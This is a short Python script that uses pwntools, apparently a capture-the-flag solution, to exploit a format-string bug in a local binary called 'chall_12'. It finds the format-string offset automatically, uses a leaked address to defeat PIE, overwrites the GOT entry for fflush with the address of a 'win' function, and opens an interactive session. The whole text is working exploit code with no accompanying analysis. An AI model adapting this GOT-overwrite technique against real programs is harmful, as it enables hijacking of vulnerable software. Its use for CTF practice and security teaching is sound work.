from pwn import *
import re
binary = "./chall_12"

def exec_fmt(payload):
    p = process(binary)
    p.sendline()
    p.sendline(payload)
    return p.recvall()

autofmt = FmtStr(
    exec_fmt
)  #we're passing a function as the argument, they will use the function until they find offset
elf = ELF(binary)
p = process(binary)
resp = p.recv()
leak = int(re.findall(b"([a-f0-9]{8,16})",resp)[0],16) #leaked address
elf.address = leak - elf.sym.main #got is 0 based, PIE will mess it up
p.sendline()
p.sendline(fmtstr_payload(autofmt.offset, {elf.got.fflush: elf.sym.win}))
p.interactive()
